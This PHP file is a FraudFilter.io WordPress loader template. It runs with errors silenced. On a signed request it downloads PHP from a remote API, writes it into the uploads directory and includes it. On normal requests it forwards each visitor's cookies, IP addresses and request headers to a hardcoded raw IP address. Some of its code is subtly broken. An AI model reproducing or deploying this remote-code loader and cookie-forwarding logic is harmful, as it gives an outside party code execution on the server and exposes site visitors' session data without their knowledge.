<?php

//ADVANCED fraudfilter.io TEMPLATE
error_reporting(0);

class FraudFilterWordPressLoader_mk8ut {
    public function run() {
        global $fbIncludedFileName;
        global $fbIncludedHomeDir;

        $clid = $this->getClidTemp();
        $wpmode = function_exists('wp_upload_dir');

        $home = '';

        if ($wpmode) {
            $upload_dir = wp_upload_dir();
            $home = $upload_dir['basedir'];
            $fileName = $home.'/'.$clid.'.include.php';
        } else {
            $home = realpath(dirname(__FILE__));
            $fileName = $home.'/'.$clid.'.include.php';
        }

        $fbIncludedFileName = $fileName;
        $fbIncludedHomeDir = $home;

        if (isset($_GET['ff17x_sign']) && isset($_GET['ff17x_time']) && isset($_GET['ff17x_mode'])) {
            if (!file_exists($fileName) || $_GET['ff17x_mode'] == 'diagnostics' || $_GET['ff17x_mode'] == 'upgrade') {
                if ($this->isSignatureValidTemp($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
                    try {
                        error_reporting(-1);
                        $diagnosticsResult = $this->performDiagnosticsWP($home, $fileName);
                        if (!$diagnosticsResult['success']) {
                            echo(json_encode($diagnosticsResult));
                        } else {
                            if ($_GET['ff17x_mode'] != 'diagnostics' || !file_exists($fileName)) {
                                $this->downloadScriptFirstTime($home, $fileName);
                            } else {
                                echo(json_encode($diagnosticsResult));
                            }
                        }
                    } catch (Exception $e) {
                        $errors = array();
                        $errors[] = $e;
                        $result = array('success' => false, 'errors' => $errors, 'version' => 4);
                        echo(json_encode($result));
                    }
                    die();
                }
            }
        }

        if (file_exists($fileName)) {
            include($fileName);
        }
    }

    function getClidTemp() {
        return 'mk8ut';
    }

    function isSignatureValidTemp($sign, $time) {
        $str = '69b66e8d-787e-4188-aee9-6b9744bf0320.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }

    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 69b66e8d-787e-4188-aee9-6b9744bf0320',
                'timeout' => 2
            )
        );

        $context  = stream_context_create($opts);

        return file_get_contents($this->getFileNameForUpdatesWP("contents"), false, $context);
    }

    function getFileNameForUpdatesWP($type) {
        return "https://api.fraudfilter.io/v1/integration/get-updates?clid=".$this->getClidTemp().'&integrationType=EMBED&type='.$type;
    }

    function isSignature2ValidTemp($content) {
        return strpos($content, '@FraudFilter.io 20') !== false;
    }

    function downloadScriptFirstTime($home, $fileName) {
        $output = $this->getUpgradeScriptViaContentsWP($home, $fileName);

        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            $ch = curl_init($this->getFileNameForUpdatesWP("curl"));

            $data_to_post = array();
            $headers = array();

            $headers[] = 'x-ff-secret: 69b66e8d-787e-4188-aee9-6b9744bf0320';

            curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);

            $output = curl_exec($ch);

            if (!$this->isSignature2ValidTemp($output)) {
                echo('{"success":false, "phpversion": "'.phpversion().'","version": 5, "errorMessage":"Malformed answer received from the server. Please try again"}');
                die();
            }
            $sha = sha1($output);
        }

        $file = fopen($fileName, 'w');
        $written = fwrite($file, $output);
        fclose($file);
        if ($file) {
            echo('{"success":true, "phpversion": "'.phpversion().'","version": 5}');
        } else if (!$written) {
            echo('{"success":false, "version": 5, "errorMessage":"Unable to write to php file: '.$fileName.'". Please issue 775 permission to the folder : '.$home.'"}');
            die();
        } else {
            echo('{"success":false, "version": 5, "errorMessage":"Unable to save php file: '.$fileName.'". Please issue 775 permission to the folder : '.$home.'"}');
            die();
        }
        curl_close($ch);
    }

    function hasPermissionsIssuesWP($home, $fileName) {
        ob_start();
        $tempFileName = $fileName.'.tempfile';
        $tempFile = fopen($tempFileName, 'w');
        if ( !$tempFile ) {
            ob_end_clean();
            return array('code' => 'WRITE_PERMISSION','args' => array($tempFileName, $home));
        } else {
            ob_end_clean();
            $meta_data = stream_get_meta_data($tempFile);
            $fullfilename = $meta_data["uri"];
            fclose($tempFile);
            return unlink($tempFileName) ? "" : array('code' => 'UNABLE_TO_DELETE_TEMP_FILE','args' => array($tempFileName, $home));
        }
    }

    function performDiagnosticsWP($home, $fileName) {
        header("X-FF: true");
        $errors = array();
        $extErrors = array();
        $success = true;
        $permissionsIssues = $this->hasPermissionsIssuesWP($home, $fileName);
        if ($permissionsIssues) {
            $extErrors[] = $permissionsIssues;
            $success = false;
        }
        $serverConnectionIssues = $this->getCurlConnectionIssuesWP();
        $contentsConnectionIssues = $this->getContentsConnectionIssuesWP();
        $result = array('success' => $success, 'diagnostics' => true, 'extErrors' => $extErrors, 'errors' => $errors, 'version' => 5, 'phpversion' => phpversion(), 'connection' => $serverConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
        return $result;
    }

    function getCurlConnectionIssuesWP() {
        return $this->sendRequestAndGetResultCurlWP2(true);
    }

    function getContentsConnectionIssuesWP() {
        return $this->sendRequestAndGetResultFileGetContentsWP2(true);
    }

    function sendRequestAndGetResultWP2($diagnostics) {
        return $this->sendRequestAndGetResultCurlWP2($diagnostics);
    }

    function sendRequestAndGetResultCurlWP2($diagnostics) {
        $resultObj = (object)array('result' => false);

        if ($diagnostics) {
            if (!function_exists('curl_init')) {
                $resultObj->curlAnswerType = "NO_CURL";
                return $resultObj;
            }
        }

        $url = "http://130.211.20.155/mk8ut";
        $nParam = '781eb4n';
        if (isset($_GET[$nParam])) {
            $url = $url . '&'.$nParam.'='.$_GET[$nParam];
        }
        if ($diagnostics) {
            $url = $url."?diagnostics=true";
        }
        $ch = curl_init($url);

        $headers = $this->fillAllPostHeaders();

        curl_setopt($ch, CURLOPT_POST, 1);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);

        $output = curl_exec($ch);
        $curl_error_number = curl_errno($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CURL_ANSWER";
            $resultObj->output = $output;
            $resultObj->httpCode = $http_status;
            $resultObj->curlErrorNumber = $curl_error_number;
        } else if ($output==='') {
            $this->notifyAboutError("EMPTY_ANSWER_curl_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else if (strlen($output) <= 3) {
            $this->notifyAboutError("SHORT_ANSWER_curl_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else {
            $result = $output[0];
            $sep = $output[1];
            if ($result != '0' && $result != '1' || $sep != ';') {
                $this->notifyAboutError("INVALID_PREFIX_curl_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
            }
            $resultObj->type = substr($output, 2, 1);
            $resultObj->url = substr($output, 4);
            if ($result === '1') {
                $resultObj->result = 1;
            } else if ($output === '0') {
                $resultObj->result = 0;
            }
        }

        curl_close($ch);
        return $resultObj;
    }

    function sendRequestAndGetResultFileGetContentsWP2($diagnostics) {
        $time_start = microtime(true);

        $resultObj = (object)array('result' => false);

        $url = "http://130.211.20.155/mk8ut";
        $nParam = '781eb4n';
        if (isset($_GET[$nParam])) {
            $url = $url . '&'.$nParam.'='.$_GET[$nParam];
        }
        if ($diagnostics) {
            $url = $url."?diagnostics=true";
        }

        $headers = $this->fillAllPostHeaders();

        $postdata = http_build_query(
            $headers
        );

        $opts = array('http' =>
            array(
                'method'  => 'POST',
                'header' => $this->getHeadersAsOneString($headers),
                'timeout' => 2,
                'ignore_errors' => true
            )
        );

        $context  = stream_context_create($opts);

        $output = file_get_contents($url, false, $context);

        $output = trim($output);

        $diff = microtime(true) - $time_start;

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CONTENTS_ANSWER";
            $resultObj->output = $output;
        } else if ($output==='') {
            $this->notifyAboutError("EMPTY_ANSWER_contents_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else if (strlen($output) <= 3) {
            $this->notifyAboutError("SHORT_ANSWER_contents_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else {
            $result = $output[0];
            $sep = $output[1];
            if ($result != '0' && $result != '1' || $sep != ';') {
                $this->notifyAboutError('INVALID_PREFIX_contents_diff='.$diff.'_output='.$output);
            }
            $resultObj->type = substr($output, 2, 1);
            $resultObj->url = substr($output, 4);
            if ($result === '1') {
                $resultObj->result = 1;
            } else if ($output === '0') {
                $resultObj->result = 0;
            }
        }

        return $resultObj;
    }


   function getHeadersAsOneString($headers) {
        $endline = "
";
        $answer = "";
        foreach ($headers as &$arr) {
            $answer = $answer.$arr.$endline;
        }
        return $answer;
    }

    function fillAllPostHeaders() {
        $headers = array();
        $headers[] = 'content-length: 0';
        $headers[] = 'X-FF-P: 69b66e8d-787e-4188-aee9-6b9744bf0320';
        $this->addHeader($headers, 'X-FF-REMOTE-ADDR', 'REMOTE_ADDR');
        $this->addHeader($headers, 'X-FF-X-FORWARDED-FOR', 'HTTP_X_FORWARDED_FOR');
        $this->addHeader($headers, 'X-FF-X-REAL-IP', 'HTTP_X_REAL_IP');
        $this->addHeader($headers, 'X-FF-DEVICE-STOCK-UA', 'HTTP_DEVICE_STOCK_UA');
        $this->addHeader($headers, 'X-FF-X-OPERAMINI-PHONE-UA', 'HTTP_X_OPERAMINI_PHONE_UA');
        $this->addHeader($headers, 'X-FF-HEROKU-APP-DIR', 'HEROKU_APP_DIR');
        $this->addHeader($headers, 'X-FF-X-FB-HTTP-ENGINE', 'X_FB_HTTP_ENGINE');
        $this->addHeader($headers, 'X-FF-X-PURPOSE', 'X_PURPOSE');
        $this->addHeader($headers, 'X-FF-REQUEST-SCHEME', 'REQUEST_SCHEME');
        $this->addHeader($headers, 'X-FF-CONTEXT-DOCUMENT-ROOT', 'CONTEXT_DOCUMENT_ROOT');
        $this->addHeader($headers, 'X-FF-SCRIPT-FILENAME', 'SCRIPT_FILENAME');
        $this->addHeader($headers, 'X-FF-REQUEST-URI', 'REQUEST_URI');
        $this->addHeader($headers, 'X-FF-SCRIPT-NAME', 'SCRIPT_NAME');
        $this->addHeader($headers, 'X-FF-PHP-SELF', 'PHP_SELF');
        $this->addHeader($headers, 'X-FF-REQUEST-TIME-FLOAT', 'REQUEST_TIME_FLOAT');
        $this->addHeader($headers, 'X-FF-COOKIE', 'HTTP_COOKIE');
        $this->addHeader($headers, 'X-FF-ACCEPT-ENCODING', 'HTTP_ACCEPT_ENCODING');
        $this->addHeader($headers, 'X-FF-ACCEPT-LANGUAGE', 'HTTP_ACCEPT_LANGUAGE');
        $this->addHeader($headers, 'X-FF-CF-CONNECTING-IP', 'HTTP_CF_CONNECTING_IP');
        $this->addHeader($headers, 'X-FF-INCAP-CLIENT-IP', 'HTTP_INCAP_CLIENT_IP');
        $this->addHeader($headers, 'X-FF-QUERY-STRING', 'QUERY_STRING');
        $this->addHeader($headers, 'X-FF-X-FORWARDED-FOR', 'X_FORWARDED_FOR');
        $this->addHeader($headers, 'X-FF-ACCEPT', 'HTTP_ACCEPT');
        $this->addHeader($headers, 'X-FF-X-WAP-PROFILE', 'X_WAP_PROFILE');
        $this->addHeader($headers, 'X-FF-PROFILE', 'PROFILE');
        $this->addHeader($headers, 'X-FF-WAP-PROFILE', 'WAP_PROFILE');
        $this->addHeader($headers, 'X-FF-REFERER', 'HTTP_REFERER');
        $this->addHeader($headers, 'X-FF-HOST', 'HTTP_HOST');
        $this->addHeader($headers, 'X-FF-VIA', 'HTTP_VIA');
        $this->addHeader($headers, 'X-FF-CONNECTION', 'HTTP_CONNECTION');
        $this->addHeader($headers, 'X-FF-X-REQUESTED-WITH', 'HTTP_X_REQUESTED_WITH');
        $this->addHeader($headers, 'User-Agent', 'HTTP_USER_AGENT');
        $this->addHeader($headers, 'Expected', '');

        $hh = $this->getallheadersFF();
        $counter = 0;
        foreach ($hh as $key => $value) {
            $k = strtolower($key);
            if ($k === 'host') {
                $headers[] = 'X-FF-HOST-ORDER: '.$counter;
                break;
            }
            $counter = $counter + 1;
        }
        return $headers;
    }

    function getallheadersFF() {
        $headers = '';
        foreach ( $_SERVER as $name => $value ) {
            if ( substr( $name, 0, 5 ) == 'HTTP_' ) {
                $headers[ str_replace( ' ', '-', ucwords( strtolower( str_replace( '_', ' ', substr( $name, 5 ) ) ) ) ) ] = $value;
            }
        }
        return $headers;
    }

    function addHeader(& $headers, $out, $in) {
        if (!isset( $_SERVER[$in] )) {
            return;
        }
        $value = $_SERVER[$in];
        if (is_array($value)) {
            $value = implode(',', $value);
        }
        $headers[] = $out.': '.$value;
    }

    function setError($resultObj, $code, $param1 = null, $param2 = null, $param3 = null) {
        $resultObj->errorCode = $code;
        $resultObj->error = $code;
        if ($param1 != null) {
            $resultObj->$param1 = $param1;
        }
        if ($param2 != null) {
            $resultObj->$param2 = $param2;
        }
        if ($param3 != null) {
            $resultObj->$param3 = $param3;
        }
        return $resultObj;
    }

    function notifyAboutError($message) {
        $len = strlen($message);
        if ($len > 800) {
            $message = substr($message, 0, 800);
        }
        $message = urlencode($message);

        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=mk8ut&m='.$message;
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);

        $output = curl_exec($ch);
    }

}

$fraudFilterWordPressLoader_mk8ut = new FraudFilterWordPressLoader_mk8ut();
$fraudFilterWordPressLoader_mk8ut->run();

// @FraudFilter.io 2017
?>

